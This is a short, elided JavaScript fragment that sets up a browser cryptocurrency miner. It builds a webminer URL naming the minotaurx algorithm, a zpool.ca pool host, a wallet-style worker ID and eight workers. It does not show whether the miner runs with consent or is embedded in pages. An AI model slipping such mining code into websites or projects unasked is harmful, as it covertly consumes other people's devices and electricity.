...
(async () => {
  ...
  const url = 'https://webminer.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RNjJNDLa4A7A2vvwhZCnP6d8n2Jfgn8Kvw&password=c%3DRVN&workers=8';
